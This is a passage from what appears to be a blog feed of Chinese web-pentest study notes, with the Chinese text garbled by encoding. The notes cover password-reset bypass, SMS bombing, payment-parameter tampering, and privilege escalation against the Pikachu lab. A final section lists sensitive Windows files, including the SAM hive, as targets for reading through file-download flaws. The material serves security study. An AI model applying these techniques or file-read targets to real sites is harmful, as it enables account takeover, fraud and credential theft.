href="https://github.com/bit4woo/reCAPTCHA/releases/tag/v1.0">https://github.com/bit4woo/reCAPTCHA/releases/tag/v1.0</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å°è¿ªå­¦ä¹ ç¬”è®° </tag>
            
            <tag> é€»è¾‘è¶Šæƒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>35WEBæ¼æ´-é€»è¾‘è¶Šæƒä¹‹æ‰¾å›æœºåˆ¶åŠæ¥å£çˆ†ç ´</title>
      <link href="/2021/09/21/35WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E5%8F%8A%E6%8E%A5%E5%8F%A3%E7%88%86%E7%A0%B4/"/>
      <url>/2021/09/21/35WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E5%8F%8A%E6%8E%A5%E5%8F%A3%E7%88%86%E7%A0%B4/</url>
      
        <content type="html"><![CDATA[<p>ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†</p><span id="more"></span><h3 id="æ‰¾å›é‡ç½®æœºåˆ¶"><a href="#æ‰¾å›é‡ç½®æœºåˆ¶" class="headerlink" title="æ‰¾å›é‡ç½®æœºåˆ¶"></a>æ‰¾å›é‡ç½®æœºåˆ¶</h3><h4 id="å®¢æˆ·ç«¯å›æ˜¾"><a href="#å®¢æˆ·ç«¯å›æ˜¾" class="headerlink" title="å®¢æˆ·ç«¯å›æ˜¾"></a>å®¢æˆ·ç«¯å›æ˜¾</h4><p>ç‚¹å‡»è·å–éªŒè¯ç åï¼Œä¼šåœ¨æ•°æ®åŒ…ä¸­å›æ˜¾éªŒè¯ç å†…å®¹ï¼Œè€Œä¸éœ€è¦å»æ¥æ”¶æ‰‹æœºæˆ–è€…é‚®ç®±çš„éªŒè¯ç ï¼Œè¿™ç§ç§°ä¸ºå®¢æˆ·ç«¯å›æ˜¾ã€‚</p><h4 id="Response-çŠ¶æ€å€¼"><a href="#Response-çŠ¶æ€å€¼" class="headerlink" title="Response çŠ¶æ€å€¼"></a>Response çŠ¶æ€å€¼</h4><p>å½“æˆ‘ä»¬éšä¾¿è¾“å…¥ä¸€ä¸ªéªŒè¯ç ï¼Œå‘é€ç»™æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨ä¼šè¿”å›ä¸€ä¸ªé”™è¯¯çš„æ ‡å¿—æ¥å‘Šè¯‰å®¢æˆ·ç«¯ï¼Œå¦‚æœæˆ‘ä»¬å°†è¿”å›çš„æ•°æ®åŒ…è¿›è¡Œæ‹¦æˆªï¼Œé‚£ä¹ˆå¦‚æœå®¢æˆ·ç«¯éªŒè¯çš„è¿™ä¸ªç»“æœä¸æ˜¯ä¾æ®æœåŠ¡å™¨çš„è¯ï¼Œå°±ä¼šæˆåŠŸéªŒè¯ã€‚</p><h4 id="éªŒè¯ç çˆ†ç ´"><a href="#éªŒè¯ç çˆ†ç ´" class="headerlink" title="éªŒè¯ç çˆ†ç ´"></a>éªŒè¯ç çˆ†ç ´</h4><p>å½“éªŒè¯ç é•¿åº¦è¾ƒçŸ­çš„æ—¶å€™ï¼Œæ¯”å¦‚è¯´4ä½æ•°å­—ï¼Œå°±å¯ä»¥ä½¿ç”¨çˆ†ç ´å·¥å…·è¿›è¡ŒéªŒè¯ç çˆ†ç ´</p><h4 id="æ‰¾å›æµç¨‹ç»•è¿‡"><a href="#æ‰¾å›æµç¨‹ç»•è¿‡" class="headerlink" title="æ‰¾å›æµç¨‹ç»•è¿‡"></a>æ‰¾å›æµç¨‹ç»•è¿‡</h4><p>ä¸€èˆ¬æˆ‘ä»¬åœ¨æ‰¾å›å¯†ç æ—¶ï¼Œç¬¬ä¸€æ­¥ä¼šå…ˆéªŒè¯æ‰‹æœºçš„éªŒè¯ç ï¼Œç¬¬ä¸€æ­¥é€šè¿‡åï¼Œç¬¬äºŒæ­¥ä¼šè¿›è¡Œä¿®æ”¹å¯†ç ã€‚æˆ‘ä»¬æŠ“å–ç¬¬äºŒæ­¥ä¿®æ”¹å¯†ç çš„æ•°æ®åŒ…ï¼Œå½“æˆ‘ä»¬éšæœºä¿®æ”¹ä¸€ä¸ªè´¦å·çš„å¯†ç æ—¶ï¼Œç›´æ¥å°†ç¬¬äºŒæ­¥çš„æ•°æ®åŒ…å¤åˆ¶ä¸Šå»ï¼Œå°±å¯ä»¥ç»•è¿‡ç¬¬ä¸€æ­¥éªŒè¯æµç¨‹ã€‚</p><h3 id="æ¥å£è°ƒç”¨ä¹±ç”¨"><a href="#æ¥å£è°ƒç”¨ä¹±ç”¨" class="headerlink" title="æ¥å£è°ƒç”¨ä¹±ç”¨"></a>æ¥å£è°ƒç”¨ä¹±ç”¨</h3><p>çŸ­ä¿¡è½°ç‚¸ï¼Œæ¥ç”µè½°ç‚¸ç­‰</p><h3 id="æ¶‰åŠèµ„æºï¼š"><a href="#æ¶‰åŠèµ„æºï¼š" class="headerlink" title="æ¶‰åŠèµ„æºï¼š"></a>æ¶‰åŠèµ„æºï¼š</h3><ul><li><a href="http://downcode.com/downcode/j_16621.shtml">http://downcode.com/downcode/j_16621.shtml</a></li><li><a href="https://pan.baidu.com/s/1P73QFmEhY6f350CvmnOJNg">https://pan.baidu.com/s/1P73QFmEhY6f350CvmnOJNg</a> æå–ç ï¼šxiao</li><li><a href="https://pan.baidu.com/s/1N963jFjTefNc6Gnso-RHmw">https://pan.baidu.com/s/1N963jFjTefNc6Gnso-RHmw</a> æå–ç ï¼šxiao</li><li><a href="https://www.mozhe.cn/bug/detail/K2sxTTVYaWNncUE1cTdyNXIyTklHdz09bW96aGUmozhe">https://www.mozhe.cn/bug/detail/K2sxTTVYaWNncUE1cTdyNXIyTklHdz09bW96aGUmozhe</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å°è¿ªå­¦ä¹ ç¬”è®° </tag>
            
            <tag> é€»è¾‘è¶Šæƒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>34WEBæ¼æ´-é€»è¾‘è¶Šæƒä¹‹æ”¯ä»˜æ•°æ®ç¯¡æ”¹å®‰å…¨</title>
      <link href="/2021/09/21/34WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%94%AF%E4%BB%98%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9%E5%AE%89%E5%85%A8/"/>
      <url>/2021/09/21/34WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%94%AF%E4%BB%98%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<p>ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†</p><span id="more"></span><h3 id="ç™»å½•åº”ç”¨åŠŸèƒ½ç‚¹å®‰å…¨é—®é¢˜"><a href="#ç™»å½•åº”ç”¨åŠŸèƒ½ç‚¹å®‰å…¨é—®é¢˜" class="headerlink" title="ç™»å½•åº”ç”¨åŠŸèƒ½ç‚¹å®‰å…¨é—®é¢˜"></a>ç™»å½•åº”ç”¨åŠŸèƒ½ç‚¹å®‰å…¨é—®é¢˜</h3><p><strong>æ£€æµ‹</strong></p><p>å­˜åœ¨ç™»å½•åŠŸèƒ½çš„ä½ç½®</p><p><strong>å±å®³</strong></p><p>ä¸ç”¨è´¦å·å¯†ç ï¼Œç›´æ¥ç™»å½•</p><h4 id="ç™»å½•ç‚¹æš´åŠ›ç ´è§£"><a href="#ç™»å½•ç‚¹æš´åŠ›ç ´è§£" class="headerlink" title="ç™»å½•ç‚¹æš´åŠ›ç ´è§£"></a>ç™»å½•ç‚¹æš´åŠ›ç ´è§£</h4><p>å¦‚æœæ•°æ®åŒ…ä¼ è¾“çš„è´¦å·å¯†ç æ²¡æœ‰åŠ å¯†æˆ–åŠ å¯†æ–¹å¼å·²çŸ¥ï¼Œå¯ä»¥å°è¯•æš´åŠ›ç ´è§£</p><h4 id="HTTP-HTTPS-ä¼ è¾“"><a href="#HTTP-HTTPS-ä¼ è¾“" class="headerlink" title="HTTP/HTTPS ä¼ è¾“"></a>HTTP/HTTPS ä¼ è¾“</h4><p>HTTPæ˜¯æ˜æ–‡ä¼ è¾“çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åœ¨è¿›è¡Œå¯†ç ç™»å½•çš„æ—¶å€™ï¼Œè´¦å·å’Œå¯†ç æ˜¯æ²¡æœ‰åŠ å¯†çš„ã€‚è¿™ç§æˆ‘ä»¬æ˜¯å¯ä»¥ç›´æ¥è¿›è¡Œçˆ†ç ´çš„ã€‚</p><p>è€ŒHTTPSåœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æ˜¯è¿›è¡ŒåŠ å¯†çš„ï¼Œåœ¨è¿›è¡Œç™»å½•çš„æ—¶å€™å¦‚æœæˆ‘ä»¬æ— æ³•å¾—çŸ¥ä»–çš„åŠ å¯†å½¢å¼ï¼Œæ˜¯æ— æ³•çˆ†ç ´çš„ï¼Œå½“ç„¶æœ‰çš„æ—¶å€™ä¹Ÿæ²¡æœ‰åŠ å¯†ï¼Œå…·ä½“æƒ…å†µå¯ä»¥ç¢°åˆ°äº†çœ‹ä¸€ä¸‹æ•°æ®åŒ…ã€‚</p><h4 id="Cookie-è„†å¼±ç‚¹éªŒè¯"><a href="#Cookie-è„†å¼±ç‚¹éªŒè¯" class="headerlink" title="Cookie è„†å¼±ç‚¹éªŒè¯"></a>Cookie è„†å¼±ç‚¹éªŒè¯</h4><p>ä»£ç å®¡è®¡</p><p>çœ‹çœ‹Cookieæœ‰æ— å¯æ“ä½œçš„å€¼ï¼Œè°ƒæ•´é‚£äº›è·Ÿä½ ç™»å½•é¡µé¢æœ‰å…³çš„é¡¹ï¼Œçœ‹æ˜¯å¦ä¼šå½±å“åŠŸèƒ½ã€‚å¦‚ä¿®æ”¹â€œuserâ€çš„å€¼</p><h4 id="Session-å›ºå®šç‚¹æµ‹è¯•"><a href="#Session-å›ºå®šç‚¹æµ‹è¯•" class="headerlink" title="Session å›ºå®šç‚¹æµ‹è¯•"></a>Session å›ºå®šç‚¹æµ‹è¯•</h4><h4 id="éªŒè¯å¯†æ–‡æ¯”å¯¹å®‰å…¨æµ‹è¯•"><a href="#éªŒè¯å¯†æ–‡æ¯”å¯¹å®‰å…¨æµ‹è¯•" class="headerlink" title="éªŒè¯å¯†æ–‡æ¯”å¯¹å®‰å…¨æµ‹è¯•"></a>éªŒè¯å¯†æ–‡æ¯”å¯¹å®‰å…¨æµ‹è¯•</h4><h3 id="æ•°æ®ç¯¡æ”¹å®‰å…¨é—®é¢˜"><a href="#æ•°æ®ç¯¡æ”¹å®‰å…¨é—®é¢˜" class="headerlink" title="æ•°æ®ç¯¡æ”¹å®‰å…¨é—®é¢˜"></a>æ•°æ®ç¯¡æ”¹å®‰å…¨é—®é¢˜</h3><h4 id="æŒ–æ´æŠ€å·§ï¼šæ”¯ä»˜æ¼æ´ä¹‹æ€»ç»“"><a href="#æŒ–æ´æŠ€å·§ï¼šæ”¯ä»˜æ¼æ´ä¹‹æ€»ç»“" class="headerlink" title="æŒ–æ´æŠ€å·§ï¼šæ”¯ä»˜æ¼æ´ä¹‹æ€»ç»“"></a>æŒ–æ´æŠ€å·§ï¼šæ”¯ä»˜æ¼æ´ä¹‹æ€»ç»“</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.secpulse.com/archives/67080.html</span><br></pre></td></tr></table></figure><h4 id="å•†å“è´­ä¹°æµç¨‹ï¼š"><a href="#å•†å“è´­ä¹°æµç¨‹ï¼š" class="headerlink" title="å•†å“è´­ä¹°æµç¨‹ï¼š"></a>å•†å“è´­ä¹°æµç¨‹ï¼š</h4><p>é€‰æ‹©å•†å“å’Œæ•°é‡-é€‰æ‹©æ”¯ä»˜åŠé…é€æ–¹å¼-ç”Ÿæˆè®¢å•ç¼–å·-è®¢å•æ”¯ä»˜é€‰æ‹©-å®Œæˆæ”¯ä»˜</p><h4 id="å¸¸è§ç¯¡æ”¹å‚æ•°ï¼š"><a href="#å¸¸è§ç¯¡æ”¹å‚æ•°ï¼š" class="headerlink" title="å¸¸è§ç¯¡æ”¹å‚æ•°ï¼š"></a>å¸¸è§ç¯¡æ”¹å‚æ•°ï¼š</h4><p>å•†å“ç¼–å· IDï¼Œè´­ä¹°ä»·æ ¼ï¼Œè´­ä¹°æ•°é‡ï¼Œæ”¯ä»˜æ–¹å¼ï¼Œè®¢å•å·ï¼Œæ”¯ä»˜çŠ¶æ€ç­‰</p><h4 id="å¸¸è§ä¿®æ”¹æ–¹æ³•ï¼š"><a href="#å¸¸è§ä¿®æ”¹æ–¹æ³•ï¼š" class="headerlink" title="å¸¸è§ä¿®æ”¹æ–¹æ³•ï¼š"></a>å¸¸è§ä¿®æ”¹æ–¹æ³•ï¼š</h4><p>æ›¿æ¢æ”¯ä»˜ï¼Œé‡å¤æ”¯ä»˜ï¼Œæœ€å°é¢æ”¯ä»˜ï¼Œè´Ÿæ•°æ”¯ä»˜ï¼Œæº¢å‡ºæ”¯ä»˜ï¼Œä¼˜æƒ åˆ¸æ”¯ä»˜ç­‰</p><h3 id="æ¶‰åŠèµ„æº"><a href="#æ¶‰åŠèµ„æº" class="headerlink" title="æ¶‰åŠèµ„æº"></a>æ¶‰åŠèµ„æº</h3><ul><li><a href="https://www.zblogcn.com/zblogphp/">https://www.zblogcn.com/zblogphp/</a></li><li><a href="https://github.com/huyuanzhi2/password_brute_dictionary">https://github.com/huyuanzhi2/password_brute_dictionary</a></li><li><a href="https://pan.baidu.com/s/1fJaW23UdcXcSFigX0-Duwg">https://pan.baidu.com/s/1fJaW23UdcXcSFigX0-Duwg</a> æå–ç ï¼šxiao</li><li><a href="https://pan.baidu.com/s/1fJaW23UdcXcSFigX0-Duwg">https://pan.baidu.com/s/1fJaW23UdcXcSFigX0-Duwg</a> æå–ç ï¼šxiao</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å°è¿ªå­¦ä¹ ç¬”è®° </tag>
            
            <tag> é€»è¾‘è¶Šæƒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>33WEBæ¼æ´-é€»è¾‘è¶Šæƒä¹‹æ°´å¹³å‚ç›´è¶Šæƒå…¨è§£</title>
      <link href="/2021/09/21/33WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/"/>
      <url>/2021/09/21/33WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†</p><span id="more"></span><h3 id="è¶Šæƒ"><a href="#è¶Šæƒ" class="headerlink" title="è¶Šæƒ"></a>è¶Šæƒ</h3><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109172036364.png" alt="image-20210917203653188" style="zoom:67%;" /><h4 id="æ°´å¹³è¶Šæƒ"><a href="#æ°´å¹³è¶Šæƒ" class="headerlink" title="æ°´å¹³è¶Šæƒ"></a>æ°´å¹³è¶Šæƒ</h4><p><strong>åŸç†</strong></p><p>é€šè¿‡æ›´æ¢çš„æŸä¸ª ID ä¹‹ç±»çš„èº«ä»½æ ‡è¯†ï¼Œä»è€Œä½¿ A è´¦å·è·å–ï¼ˆä¿®æ”¹ã€åˆ é™¤ç­‰ï¼‰B è´¦å·æ•°æ®ã€‚</p><h4 id="å‚ç›´è¶Šæƒ"><a href="#å‚ç›´è¶Šæƒ" class="headerlink" title="å‚ç›´è¶Šæƒ"></a>å‚ç›´è¶Šæƒ</h4><p><strong>åŸç†</strong></p><p>ä½¿ç”¨ä½æƒé™èº«ä»½çš„è´¦å·ï¼Œå‘é€é«˜æƒé™è´¦å·æ‰èƒ½æœ‰çš„è¯·æ±‚ï¼Œè·å¾—å…¶é«˜æƒé™çš„æ“ä½œã€‚</p><h4 id="æœªæˆæƒè®¿é—®"><a href="#æœªæˆæƒè®¿é—®" class="headerlink" title="æœªæˆæƒè®¿é—®"></a>æœªæˆæƒè®¿é—®</h4><p><strong>åŸç†</strong></p><p>é€šè¿‡åˆ é™¤è¯·æ±‚ä¸­çš„è®¤è¯ä¿¡æ¯åé‡æ”¾è¯¥è¯·æ±‚ï¼Œä¾æ—§å¯ä»¥è®¿é—®æˆ–è€…å®Œæˆæ“ä½œã€‚</p><h3 id="æ¡ˆä¾‹æ¼”ç¤º"><a href="#æ¡ˆä¾‹æ¼”ç¤º" class="headerlink" title="æ¡ˆä¾‹æ¼”ç¤º"></a>æ¡ˆä¾‹æ¼”ç¤º</h3><h4 id="Pikachu-æœ¬åœ°æ°´å¹³å‚ç›´è¶Šæƒæ¼”ç¤ºï¼ˆæ¼æ´æˆå› ï¼‰"><a href="#Pikachu-æœ¬åœ°æ°´å¹³å‚ç›´è¶Šæƒæ¼”ç¤ºï¼ˆæ¼æ´æˆå› ï¼‰" class="headerlink" title="Pikachu-æœ¬åœ°æ°´å¹³å‚ç›´è¶Šæƒæ¼”ç¤ºï¼ˆæ¼æ´æˆå› ï¼‰"></a>Pikachu-æœ¬åœ°æ°´å¹³å‚ç›´è¶Šæƒæ¼”ç¤ºï¼ˆæ¼æ´æˆå› ï¼‰</h4><p><strong>æ°´å¹³è¶Šæƒ</strong></p><p>é¦–å…ˆæˆ‘ä»¬æŸ¥çœ‹kobyç”¨æˆ·çš„ä¿¡æ¯</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119537.png" alt="image-20210917204306986"></p><p>æˆ‘ä»¬æŠ“åŒ…å‘ç°å‚æ•°æœ‰usernameï¼Œæˆ‘ä»¬è¯•ç€æŠŠusernameä¿®æ”¹ä¸ºå…¶ä»–ç”¨æˆ·ï¼Œèƒ½ä¸èƒ½è¾¾åˆ°ä¸€ä¸ªæ°´å¹³è¶Šæƒçš„æ•ˆæœå‘¢ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">GET /pikachu/vul/overpermission/op1/op1_mem.php?username=kobe&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http://127.0.0.1/pikachu/vul/overpermission/op1/op1_mem.php?username=kobe&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF</span><br><span class="line">Cookie: csrftoken=vKkecYAHNQy0hBzIqkW7oaJw91c8w1DPtQhCAWIXKPPgjuxTF3uii1r7lXPlDHeL; PHPSESSID=f269db34aa678e173b4b5da42cd715e4</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-User: ?1</span><br></pre></td></tr></table></figure><p>å¦‚ä½•çŸ¥é“å…¶ä»–ç”¨æˆ·çš„ç”¨æˆ·åå‘¢ï¼Œå¯ä»¥é€šè¿‡æ³¨å†Œæ—¶ï¼Œè¯¥ç”¨æˆ·åå·²å­˜åœ¨æˆ–è€…ç½‘ç«™å…¶ä»–ä¿¡æ¯æ¥è¿›è¡Œæ”¶é›†ã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109172046893.png" alt="image-20210917204613800"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæˆ‘é€šè¿‡ä¿®æ”¹nameä¸ºlucyè·å–åˆ°äº†å…¶ä»–ç”¨æˆ·çš„ä¿¡æ¯ã€‚</p><p><strong>å‚ç›´è¶Šæƒ</strong></p><p>å‰ææ¡ä»¶</p><p>å¦‚ä½•è·å–adminæ·»åŠ ç”¨æˆ·æ•°æ®åŒ…</p><ol><li>æ™®é€šç”¨æˆ·å‰ç«¯æœ‰æ“ä½œç•Œé¢å¯ä»¥æŠ“å–æ•°æ®åŒ…</li><li>é€šè¿‡ç½‘ç«™æºç è¿›è¡Œæœ¬åœ°å¤ç°æŠ“å–</li><li>ç›²çŒœ</li></ol><p>æœ‰ä¸¤ä¸ªç”¨æˆ·ä¸€ä¸ªæ˜¯<code>admin/123456</code>ä¸€ä¸ªæ˜¯<code>pikachu/000000</code>ã€‚å…¶ä¸­adminæ˜¯è¶…çº§ç”¨æˆ·</p><p>é€šè¿‡æŠ“å–adminç”¨æˆ·æ·»åŠ å…¶ä»–ç”¨æˆ·çš„æ•°æ®åŒ…</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119554.png" alt="image-20210917210113824"></p><p>ç„¶åç™»å½•æ™®é€šç”¨æˆ·ï¼Œå°è¯•åˆ©ç”¨æŠ“å–çš„æ•°æ®åŒ…è¿›è¡Œåˆ›å»ºç”¨æˆ·ã€‚å‘ç°åˆ›å»ºå¤±è´¥ï¼Œè¿™æ˜¯å› ä¸ºå½“å‰adminç”¨æˆ·çš„Cookieå·²ç»å¤±æ•ˆï¼Œæˆ‘ä»¬æ¢æˆpikachuçš„ç”¨æˆ·è¿›è¡Œå°è¯•ï¼Œå‘ç°åˆ›å»ºæˆåŠŸã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119615.png" alt="image-20210917210438333"></p><p>è¿™å°±æ˜¯å‚ç›´è¶Šæƒï¼Œé€šè¿‡æ™®é€šç”¨æˆ·çš„æƒé™å´æ‰§è¡Œäº†adminç”¨æˆ·çš„äº‹ã€‚</p><p>ç±»ä¼¼çš„è¿˜æœ‰é€šè¿‡ä¿®æ”¹æ™®é€šç”¨æˆ·å¯†ç ï¼Œå°†ç®¡ç†å‘˜å¯†ç ä¿®æ”¹æˆåŠŸä¹Ÿæ˜¯å‚ç›´è¶Šæƒã€‚</p><h4 id="è¶Šæƒæ£€æµ‹-å°ç±³èŒƒè¶Šæƒæ¼æ´æ£€æµ‹å·¥å…·ï¼ˆå·¥å…·ä½¿ç”¨ï¼‰"><a href="#è¶Šæƒæ£€æµ‹-å°ç±³èŒƒè¶Šæƒæ¼æ´æ£€æµ‹å·¥å…·ï¼ˆå·¥å…·ä½¿ç”¨ï¼‰" class="headerlink" title="è¶Šæƒæ£€æµ‹-å°ç±³èŒƒè¶Šæƒæ¼æ´æ£€æµ‹å·¥å…·ï¼ˆå·¥å…·ä½¿ç”¨ï¼‰"></a>è¶Šæƒæ£€æµ‹-å°ç±³èŒƒè¶Šæƒæ¼æ´æ£€æµ‹å·¥å…·ï¼ˆå·¥å…·ä½¿ç”¨ï¼‰</h4><h4 id="è¶Šæƒæ£€æµ‹-Burpsuite-æ’ä»¶-Authz-å®‰è£…æµ‹è¯•ï¼ˆæ’ä»¶ä½¿ç”¨ï¼‰"><a href="#è¶Šæƒæ£€æµ‹-Burpsuite-æ’ä»¶-Authz-å®‰è£…æµ‹è¯•ï¼ˆæ’ä»¶ä½¿ç”¨ï¼‰" class="headerlink" title="è¶Šæƒæ£€æµ‹-Burpsuite æ’ä»¶ Authz å®‰è£…æµ‹è¯•ï¼ˆæ’ä»¶ä½¿ç”¨ï¼‰"></a>è¶Šæƒæ£€æµ‹-Burpsuite æ’ä»¶ Authz å®‰è£…æµ‹è¯•ï¼ˆæ’ä»¶ä½¿ç”¨ï¼‰</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/weixin_33736666/article/details/113376904</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å°è¿ªå­¦ä¹ ç¬”è®° </tag>
            
            <tag> é€»è¾‘è¶Šæƒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>32WEBæ¼æ´-æ–‡ä»¶æ“ä½œä¹‹æ–‡ä»¶ä¸‹è½½è¯»å–å…¨è§£</title>
      <link href="/2021/09/21/32WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/"/>
      <url>/2021/09/21/32WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†</p><span id="more"></span><h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119186.png" alt="image-20210917093013895"></p><h3 id="æ–‡ä»¶ä¸‹è½½"><a href="#æ–‡ä»¶ä¸‹è½½" class="headerlink" title="æ–‡ä»¶ä¸‹è½½"></a>æ–‡ä»¶ä¸‹è½½</h3><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><p>ä¸€äº›æä¾›äº†æ–‡ä»¶æŸ¥çœ‹æˆ–è€…ä¸‹è½½åŠŸèƒ½çš„webåº”ç”¨åœ¨å¯¹ç”¨æˆ·æŸ¥çœ‹æˆ–ä¸‹è½½çš„æ–‡ä»¶æ²¡æœ‰é™åˆ¶çš„æƒ…å†µä¸‹ï¼Œå¯¼è‡´æ¶æ„ç”¨æˆ·èƒ½å¤ŸæŸ¥çœ‹æˆ–ä¸‹è½½ä»»æ„æ•æ„Ÿæ–‡ä»¶</p><h4 id="æ£€æµ‹"><a href="#æ£€æµ‹" class="headerlink" title="æ£€æµ‹"></a>æ£€æµ‹</h4><p><strong>ç™½ç›’</strong></p><ul><li>ä»£ç å®¡è®¡</li></ul><p><strong>é»‘ç›’</strong></p><ul><li>å…¬å¼€æ¼æ´</li><li>æ¼æ‰«å·¥å…·</li><li>æ‰‹å·¥çœ‹å‚æ•°å€¼åŠåŠŸèƒ½</li></ul><h4 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><p> <strong>å¸¸è§æ–‡ä»¶</strong></p><p>åå°æ—¥å¿—ç­‰å¯è§çš„æ–‡ä»¶</p><p><strong>æ•æ„Ÿæ–‡ä»¶</strong></p><ul><li>æ•°æ®åº“é…ç½®æ–‡ä»¶</li><li>å„ç§æ¥å£æ–‡ä»¶</li><li>å¯†é’¥ä¿¡æ¯ç­‰æ–‡ä»¶</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Windows:</span><br><span class="line">C:\boot.ini //æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬</span><br><span class="line">C:\Windows\System32\inetsrv\MetaBase.xml //IISé…ç½®æ–‡ä»¶</span><br><span class="line">C:\Windows\repair\sam 